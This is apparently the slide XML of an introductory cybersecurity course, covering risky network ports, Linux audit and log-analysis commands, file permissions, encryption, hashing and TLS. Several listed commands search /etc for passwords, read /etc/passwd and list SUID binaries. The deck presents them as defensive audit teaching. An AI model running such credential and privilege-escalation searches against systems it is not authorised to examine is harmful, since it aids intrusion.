                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>25/587  SMTP        🟡 Email — check for open relays, monitor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>53      DNS         🟡 Monitor for DNS tunnelling (data exfiltration)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>80      HTTP        🟡 Redirect to HTTPS — no sensitive data over HTTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>443     HTTPS       🟢 Encrypted web — verify valid certificates</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>445     SMB         🔴 HIGH RISK — EternalBlue/WannaCry exploited this</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3306    MySQL       🔴 Should NEVER be open to internet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3389    RDP         🔴 Remote Desktop — heavily brute-forced</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>8080    HTTP Alt    🟡 Often development/proxy — check if intentional</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BEGINNER</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3 OPENER: LINUX</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ESSENTIAL LINUX COMMANDS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ESSENTIAL SECURITY COMMANDS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>NAVIGATION &amp; FILES            SEARCHING                NETWORK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>────────────────              ─────────────            ──────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>pwd  # Where am I?            grep "Failed" auth.log   ip addr</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ls -la  # All files           grep -r "pass" /etc/     ss -tlnp  # Ports</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>cat /etc/passwd               find / -name "*.sh"      ping 8.8.8.8</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>tail -f /var/log/auth.log     find / -perm -4000       traceroute site.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>chmod 600 private.key         strings binary | grep IP  curl -I https://site</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>chown root:root file          awk '{print $1}' | sort   wget https://url/file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>LOG ANALYSIS SUPERPOWERS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t># Find all failed SSH logins:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t># Who logged in successfully:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>grep "Accepted" /var/log/auth.log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t># What did sudo users do:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>grep "sudo:" /var/log/auth.log</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FILE PERMISSIONS — VISUALISED</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LINUX FILE PERMISSIONS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>-rwxr-xr--</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│││└┬┘└┬┘└┬┘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│││ │   │  └── OTHERS: r-- = read only (4)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│││ │   └───── GROUP:  r-x = read + execute (5)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│││ └───────── OWNER:  rwx = read + write + execute (7)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>││└─────────── Type: - = file, d = directory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>OCTAL:  r=4  w=2  x=1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SECURITY RULES:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>chmod 777  NEVER — world-writable is dangerous</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>chmod 755  Web scripts and executables (rwxr-xr-x)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>chmod 644  Web-accessible files (rw-r--r--)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>chmod 600  Private keys, secrets (rw-------)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>chmod 640  Config files (rw-r-----)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AUDIT COMMANDS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>find / -perm -o+w  # World-writable files = risk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>find / -perm -4000  # SUID files = privilege escalation risk</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INTERMEDIATE</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4 OPENER: CRYPTOGRAPHY</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SYMMETRIC VS ASYMMETRIC ENCRYPTION</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TWO TYPES OF ENCRYPTION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SYMMETRIC                         ASYMMETRIC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>─────────────────────             ─────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Same key: encrypt AND decrypt     Public key: encrypt / verify</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Private key: decrypt / sign</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Fast (AES-256 = very fast)        Slow (RSA = computationally expensive)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Great for large data              Great for key exchange, signatures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>The Problem:                      The Solution:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>How do you share the key          What the public key encrypts,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>securely?                         ONLY the private key decrypts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>REAL-WORLD USE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HTTPS = Asymmetric to exchange a key → Symmetric for all data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Best of both worlds: security of asymmetric + speed of symmetric</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Nigerian example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WhatsApp E2E = your recipient's public key encrypts every message</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Only their private key (on their phone) can decrypt it</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HASHING — THE SECURITY WORKHORSE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CRYPTOGRAPHIC HASHING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ANY INPUT → [SHA-256] → ALWAYS 64 CHARACTERS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"hello"   → 2cf24dba5fb0a30e26e83b2ac5b9e29e...</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Hello"   → 185f8db32921bd46d35f6a1d23e7e7d6...</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>↑ ONE CAPITAL LETTER — COMPLETELY DIFFERENT HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Properties:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ONE-WAY       Cannot reverse the hash to find the input</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DETERMINISTIC  Same input → always same hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AVALANCHE     Tiny input change → completely different hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>COLLISION-FREE Virtually impossible to find two inputs with same hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SECURITY APPLICATIONS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Passwords     Store the HASH, never the password</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>File integrity Hash before and after — any change is detected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Blockchain    Each block's hash includes previous block's hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Digital sig   Hash the document, sign the hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>STATUS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MD5     🔴 BROKEN — collisions found 2004</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHA-1   🔴 BROKEN — deprecated 2017</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHA-256 🟢 SECURE — current standard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>bcrypt  🟢 BEST for passwords — slow by design</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TLS HANDSHAKE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HOW HTTPS WORKS — THE TLS HANDSHAKE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>BROWSER                                    SERVER</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│ ──── 1. Client Hello ────────────────→ │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│      "I support TLS 1.3, here are      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│       my cipher suites"                │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                                        │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│ ←─── 2. Server Hello + Certificate ─── │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│      "Here's my cert, here's my        │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│       public key"                      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                                        │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  3. Browser verifies certificate:      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│     ✓ Signed by trusted CA?            │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│     ✓ Domain matches?                  │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│     ✓ Not expired?                     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                                        │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
